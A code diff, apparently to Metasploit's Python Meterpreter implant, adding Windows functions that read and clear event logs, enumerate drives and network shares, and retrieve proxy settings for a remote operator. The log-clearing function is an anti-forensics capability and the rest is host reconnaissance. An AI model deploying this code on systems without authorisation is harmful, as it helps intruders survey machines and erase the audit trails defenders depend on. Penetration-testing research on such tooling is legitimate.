@@ -238,6 +238,33 @@ if has_ctypes:
 	class TOKEN_USER(ctypes.Structure):
 		_fields_ = [("User", SID_AND_ATTRIBUTES)]
 
+	class UNIVERSAL_NAME_INFO(ctypes.Structure):
+		_fields_ = [("lpUniversalName", ctypes.c_char_p)]
+
+	class EVENTLOGRECORD(ctypes.Structure):
+		_fields_ = [("Length", ctypes.c_uint32),
+			("Reserved", ctypes.c_uint32),
+			("RecordNumber", ctypes.c_uint32),
+			("TimeGenerated", ctypes.c_uint32),
+			("TimeWritten", ctypes.c_uint32),
+			("EventID", ctypes.c_uint32),
+			("EventType", ctypes.c_uint16),
+			("NumStrings", ctypes.c_uint16),
+			("EventCategory", ctypes.c_uint16),
+			("ReservedFlags", ctypes.c_uint16),
+			("ClosingRecordNumber", ctypes.c_uint32),
+			("StringOffset", ctypes.c_uint32),
+			("UserSidLength", ctypes.c_uint32),
+			("UserSidOffset", ctypes.c_uint32),
+			("DataLength", ctypes.c_uint32),
+			("DataOffset", ctypes.c_uint32)]
+
+	class WINHTTP_CURRENT_USER_IE_PROXY_CONFIG(ctypes.Structure):
+		_fields_ = [("fAutoDetect", ctypes.c_bool),
+			("lpszAutoConfigUrl", ctypes.c_wchar_p),
+			("lpszProxy", ctypes.c_wchar_p),
+			("lpszProxyBypass", ctypes.c_wchar_p)]
+
 	#
 	# Linux Structures
 	#
@@ -324,6 +351,14 @@ TLV_TYPE_FILE_MODE             = TLV_META_TYPE_STRING  | 1203
 TLV_TYPE_FILE_SIZE             = TLV_META_TYPE_UINT    | 1204
 TLV_TYPE_FILE_HASH             = TLV_META_TYPE_RAW     | 1206
 
+TLV_TYPE_MOUNT_GROUP           = TLV_META_TYPE_GROUP   | 1207
+TLV_TYPE_MOUNT_NAME            = TLV_META_TYPE_STRING  | 1208
+TLV_TYPE_MOUNT_TYPE            = TLV_META_TYPE_UINT    | 1209
+TLV_TYPE_MOUNT_SPACE_USER      = TLV_META_TYPE_QWORD   | 1210
+TLV_TYPE_MOUNT_SPACE_TOTAL     = TLV_META_TYPE_QWORD   | 1211
+TLV_TYPE_MOUNT_SPACE_FREE      = TLV_META_TYPE_QWORD   | 1212
+TLV_TYPE_MOUNT_UNCPATH         = TLV_META_TYPE_STRING  | 1213
+
 TLV_TYPE_STAT_BUF              = TLV_META_TYPE_COMPLEX | 1220
 
 TLV_TYPE_SEARCH_RECURSE        = TLV_META_TYPE_BOOL    | 1230
@@ -357,6 +392,14 @@ TLV_TYPE_NETMASK_STRING        = TLV_META_TYPE_STRING  | 1441
 TLV_TYPE_GATEWAY_STRING        = TLV_META_TYPE_STRING  | 1442
 TLV_TYPE_ROUTE_METRIC          = TLV_META_TYPE_UINT    | 1443
 TLV_TYPE_ADDR_TYPE             = TLV_META_TYPE_UINT    | 1444
+
+##
+# Proxy configuration
+##
+TLV_TYPE_PROXY_CFG_AUTODETECT    = TLV_META_TYPE_BOOL    | 1445
+TLV_TYPE_PROXY_CFG_AUTOCONFIGURL = TLV_META_TYPE_STRING  | 1446
+TLV_TYPE_PROXY_CFG_PROXY         = TLV_META_TYPE_STRING  | 1447
+TLV_TYPE_PROXY_CFG_PROXYBYPASS   = TLV_META_TYPE_STRING  | 1448
 
 ##
 # Socket
@@ -540,6 +583,10 @@ VER_PLATFORM_WIN32_NT             = 0x0002
 
 WIN_AF_INET  = 2
 WIN_AF_INET6 = 23
+
+UNIVERSAL_NAME_INFO_LEVEL = 1
+
+DRIVE_REMOTE = 4
 
 # Linux Constants
 RTM_GETLINK   = 18
@@ -1078,6 +1125,73 @@ def stdapi_sys_process_get_processes(request, response):
 		return stdapi_sys_process_get_processes_via_ps(request, response)
 	return ERROR_FAILURE, response
 
+@meterpreter.register_function_windll
+def stdapi_sys_eventlog_open(request, response):
+    source_name = packet_get_tlv(request, TLV_TYPE_EVENT_SOURCENAME)['value']
+    handle = ctypes.windll.advapi32.OpenEventLogW(None, source_name)
+    if not handle:
+        return error_result_windows(), response
+    response += tlv_pack(TLV_TYPE_EVENT_HANDLE, handle)
+    return ERROR_SUCCESS, response
+
+@meterpreter.register_function_windll
+def stdapi_sys_eventlog_read(request, response):
+    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
+    flags = packet_get_tlv(request, TLV_TYPE_EVENT_READFLAGS)['value']
+    offset = packet_get_tlv(request, TLV_TYPE_EVENT_RECORDOFFSET)['value']
+    adv32 = ctypes.windll.advapi32
+    bytes_read = ctypes.c_ulong(0)
+    bytes_needed = ctypes.c_ulong(0)
+    if adv32.ReadEventLogW(handle, flags, offset, ctypes.byref(bytes_read), 0, ctypes.byref(bytes_read), ctypes.byref(bytes_needed)):
+        return error_result_windows(), response
+    buf = ctypes.create_unicode_buffer(bytes_needed.value)
+    if not adv32.ReadEventLogW(handle, flags, offset, buf, bytes_needed, ctypes.byref(bytes_read), ctypes.byref(bytes_needed)):
+        return error_result_windows(), response
+    record = cstruct_unpack(EVENTLOGRECORD, buf)
+    response += tlv_pack(TLV_TYPE_EVENT_RECORDNUMBER, record.RecordNumber)
+    response += tlv_pack(TLV_TYPE_EVENT_TIMEGENERATED, record.TimeGenerated)
+    response += tlv_pack(TLV_TYPE_EVENT_TIMEWRITTEN, record.TimeWritten)
+    response += tlv_pack(TLV_TYPE_EVENT_ID, record.EventID)
+    response += tlv_pack(TLV_TYPE_EVENT_TYPE, record.EventType)
+    response += tlv_pack(TLV_TYPE_EVENT_CATEGORY, record.EventCategory)
+    response += tlv_pack(TLV_TYPE_EVENT_DATA, buf.raw[record.DataOffset:record.DataOffset+record.DataLength])
+    event_strings = buf.raw[record.StringOffset:].split('\x00', record.NumStrings)
+    for event_string in event_strings:
+        response += tlv_pack(TLV_TYPE_EVENT_STRING, event_string)
+    return ERROR_SUCCESS, response
+
+@meterpreter.register_function_windll
+def stdapi_sys_eventlog_clear(request, response):
+    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
+    if not ctypes.windll.advapi32.ClearEventLogW(handle, None):
+        return error_result_windows(), response
+    return ERROR_SUCCESS, response
+
+@meterpreter.register_function_windll
+def stdapi_sys_eventlog_numrecords(request, response):
+    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
+    total = ctypes.c_ulong(0)
+    if not ctypes.windll.advapi32.GetNumberOfEventLogRecords(handle, ctypes.byref(total)):
+        return error_result_windows(), response
+    response += tlv_pack(TLV_TYPE_EVENT_NUMRECORDS, total.value)
+    return ERROR_SUCCESS, response
+
+@meterpreter.register_function_windll
+def stdapi_sys_eventlog_oldest(request, response):
+    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
+    oldest = ctypes.c_ulong(0)
+    if not ctypes.windll.advapi32.GetOldestEventLogRecordW(handle, ctypes.byref(oldest)):
+        return error_result_windows(), response
+    response += tlv_pack(TLV_TYPE_EVENT_RECORDNUMBER, oldest)
+    return ERROR_SUCCESS, response
+
+@meterpreter.register_function_windll
+def stdapi_sys_eventlog_close(request, response):
+    handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
+    if not ctypes.windll.advapi32.CloseEventLogW(handle):
+        return error_result_windows(), response
+    return ERROR_SUCCESS, response
+
 @meterpreter.register_function
 def stdapi_fs_chdir(request, response):
 	wd = packet_get_tlv(request, TLV_TYPE_DIRECTORY_PATH)['value']
@@ -1233,6 +1347,47 @@ def stdapi_fs_stat(request, response):
 	path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
 	st_buf = get_stat_buffer(unicode(path))
 	response += tlv_pack(TLV_TYPE_STAT_BUF, st_buf)
+	return ERROR_SUCCESS, response
+
+@meterpreter.register_function_windll
+def stdapi_fs_mount_show(request, response):
+	try:
+		from string import uppercase as letters
+	except ImportError:
+		letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+	k32 = ctypes.windll.kernel32
+	mpr = ctypes.windll.mpr
+	# Retrieves a bitmask representing the currently available disk drives
+	bitmask = k32.GetLogicalDrives()
+	# List of currently available disk drives
+	drives = []
+	for drive_letter in letters:
+		# Check if drive is present
+		if bitmask & 1:
+			drives.append(u'{drive}:'.format(drive=drive_letter))
+		# Move to next drive letter
+		bitmask >>= 1
+	for drive in drives:
+		drive_type = k32.GetDriveTypeW(drive)
+		mount = bytes()
+		mount += tlv_pack(TLV_TYPE_MOUNT_NAME, drive)
+		mount += tlv_pack(TLV_TYPE_MOUNT_TYPE, drive_type)
+		# Get UNC path for network drives
+		if drive_type == DRIVE_REMOTE:
+			buf = ctypes.create_unicode_buffer(1024)
+			bufsize = ctypes.c_ulong(1024)
+			if mpr.WNetGetUniversalNameW(drive, UNIVERSAL_NAME_INFO_LEVEL, ctypes.byref(buf), ctypes.byref(bufsize)) == 0:
+				pUniversalNameInfo = cstruct_unpack(UNIVERSAL_NAME_INFO, buf)
+				mount += tlv_pack(TLV_TYPE_MOUNT_UNCPATH, pUniversalNameInfo.lpUniversalName)
+		# Retrieve information about the amount of space that is available on a disk volume
+		user_free_bytes = ctypes.c_ulonglong(0)
+		total_bytes = ctypes.c_ulonglong(0)
+		total_free_bytes = ctypes.c_ulonglong(0)
+		if k32.GetDiskFreeSpaceExW(drive, ctypes.byref(user_free_bytes), ctypes.byref(total_bytes), ctypes.byref(total_free_bytes)):
+			mount += tlv_pack(TLV_TYPE_MOUNT_SPACE_USER, user_free_bytes.value)
+			mount += tlv_pack(TLV_TYPE_MOUNT_SPACE_TOTAL, total_bytes.value)
+			mount += tlv_pack(TLV_TYPE_MOUNT_SPACE_FREE, total_free_bytes.value)
+		response += tlv_pack(TLV_TYPE_MOUNT_GROUP, mount)
 	return ERROR_SUCCESS, response
 
 @meterpreter.register_function
@@ -1453,6 +1608,21 @@ def stdapi_net_config_get_interfaces_via_windll_mib():
 		iface_info['mtu'] = ifrow.dwMtu
 		interfaces.append(iface_info)
 	return interfaces
+
+@meterpreter.register_function_windll
+def stdapi_net_config_get_proxy(request, response):
+	winhttp = ctypes.windll.winhttp
+	proxyConfig = WINHTTP_CURRENT_USER_IE_PROXY_CONFIG()
+	if not winhttp.WinHttpGetIEProxyConfigForCurrentUser(ctypes.byref(proxyConfig)):
+		return error_result_windows(), response
+	response += tlv_pack(TLV_TYPE_PROXY_CFG_AUTODETECT, proxyConfig.fAutoDetect)
+	if proxyConfig.lpszAutoConfigUrl:
+		response += tlv_pack(TLV_TYPE_PROXY_CFG_AUTOCONFIGURL, proxyConfig.lpszAutoConfigUrl)
+	if proxyConfig.lpszProxy:
+		response += tlv_pack(TLV_TYPE_PROXY_CFG_PROXY, proxyConfig.lpszProxy)
+	if proxyConfig.lpszProxyBypass:
+		response += tlv_pack(TLV_TYPE_PROXY_CFG_PROXYBYPASS, proxyConfig.lpszProxyBypass)
+	return ERROR_SUCCESS, response
 
 @meterpreter.register_function
 def stdapi_net_resolve_host(request, response):
